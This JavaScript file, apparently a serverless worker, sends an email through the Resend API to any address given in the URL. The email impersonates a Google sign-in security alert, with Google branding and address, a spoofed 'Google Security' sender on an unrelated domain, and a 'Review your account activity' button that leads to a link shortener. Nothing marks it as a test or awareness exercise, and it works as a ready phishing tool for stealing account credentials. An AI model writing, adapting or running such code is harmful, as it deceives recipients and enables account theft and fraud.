// index.js
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const email = url.searchParams.get('email');
    const firstName = url.searchParams.get('name');

    if (!email || !firstName) {
      return new Response('Usage: ?email=address@example.com&name=FirstName', {
        status: 400,
        headers: { 'Content-Type': 'text/plain' }
      });
    }

    const RESEND_API_KEY = env.RESEND_API_KEY;
    
    if (!RESEND_API_KEY) {
      return new Response('Error: RESEND_API_KEY not configured', {
        status: 500,
        headers: { 'Content-Type': 'text/plain' }
      });
    }

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security alert</title>
</head>
<body style="margin:0; padding:0; background:#f8f9fa; font-family:'Google Sans',Roboto,Arial,sans-serif;">
    <table width="100%" bgcolor="#f8f9fa" cellpadding="0" cellspacing="0" border="0">
        <tr>
            <td align="center" style="padding:20px 10px;">
                <table width="600" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0" style="border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); overflow:hidden;">
                    
                    <!-- Header -->
                    <tr>
                        <td style="padding:24px 32px 16px 32px; border-bottom:1px solid #dadce0;">
                            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google" width="92" height="30" style="display:block;">
                        </td>
                    </tr>
                    
                    <!-- Body -->
                    <tr>
                        <td style="padding:32px 32px 24px 32px; color:#202124; line-height:1.5;">
                            <h1 style="margin:0 0 16px 0; font-size:24px; font-weight:400;">Hi ${firstName},</h1>
                            
                            <p style="margin:0 0 24px 0; font-size:16px;">We noticed a sign-in attempt to your Google Account from a device we don't recognize. For your protection, we've blocked it.</p>
                            
                            <!-- Device card -->
                            <table width="100%" cellpadding="0" cellspacing="0" style="background:#f8f9fa; border-radius:8px; padding:20px; margin-bottom:24px;">
                                <tr>
                                    <td>
                                        <p style="margin:0 0 8px 0; font-size:14px; color:#5f6368;">Device</p>
                                        <p style="margin:0 0 16px 0; font-size:16px; font-weight:500;">Windows PC — Chrome Browser</p>
                                        
                                        <p style="margin:0 0 8px 0; font-size:14px; color:#5f6368;">Location</p>
                                        <p style="margin:0 0 16px 0; font-size:16px; font-weight:500;">Unknown location • Just now</p>
                                        
                                        <div style="display:flex; align-items:center; gap:8px;">
                                            <span style="display:inline-block; width:10px; height:10px; background:#ea4335; border-radius:50%;"></span>
                                            <span style="font-size:15px; color:#ea4335; font-weight:500;">Blocked — Suspicious activity</span>
                                        </div>
                                    </td>
                                </tr>
                            </table>
                            
                            <p style="margin:0 0 24px 0; font-size:16px;">If this was you, you can ignore this message. If not, please review your account activity right away.</p>
                            
                            <!-- BIG BLUE GOOGLE-STYLE BUTTON -->
                            <a href="https://shr.pn/google-security" 
                               target="_blank" 
                               style="display:block; width:100%; max-width:320px; margin:0 auto 24px auto; background:#1a73e8; color:#ffffff; text-decoration:none; font-weight:500; font-size:16px; padding:14px 24px; border-radius:4px; text-align:center; box-shadow:0 1px 3px rgba(26,115,232,0.3);">
                                Review your account activity
                            </a>
                            
                            <p style="margin:0 0 24px 0; font-size:14px; color:#5f6368;">This secure link will expire in 24 hours for your protection.</p>
                            
                            <p style="margin:24px 0 8px 0; font-size:15px; font-weight:500; color:#202124;">How to keep your account secure</p>
                            <ul style="margin:0; padding-left:20px; font-size:15px; line-height:1.5; color:#202124;">
                                <li style="margin-bottom:6px;">Review your recent account activity regularly at <a href="https://myaccount.google.com" style="color:#1a73e8;">myaccount.google.com</a></li>
                                <li style="margin-bottom:6px;">Never share your password or verification codes with anyone</li>
                                <li>Enable 2-Step Verification to add an extra layer of protection</li>
                            </ul>
                        </td>
                    </tr>
                    
                    <!-- Footer -->
                    <tr>
                        <td style="padding:24px 32px; background:#f8f9fa; border-top:1px solid #dadce0; font-size:12px; color:#5f6368; line-height:1.4;">
                            Google LLC • 1600 Amphitheatre Parkway • Mountain View, CA 94043<br>
                            This email was sent to <strong>${email}</strong> because you have a Google Account associated with this address.
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>`;

    const payload = {
      from: 'Google Security <security@jesusgeneration.vip>',
      to: [email],
      subject: 'Security alert: Sign-in attempt blocked',
      text: 'We blocked a suspicious sign-in attempt to your Google Account. Review now if this wasn\'t you.',
      html: html
    };

    try {
      const resendResponse = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${RESEND_API_KEY}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const result = await resendResponse.json();

      if (!resendResponse.ok) {
        return new Response(`Error sending email: ${JSON.stringify(result)}`, {
          status: 500,
          headers: { 'Content-Type': 'text/plain' }
        });
      }

      return new Response(`Email sent successfully to ${email}. ID: ${result.id}`, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });

    } catch (error) {
      return new Response(`Error: ${error.message}`, {
        status: 500,
        headers: { 'Content-Type': 'text/plain' }
      });
    }
  }
};
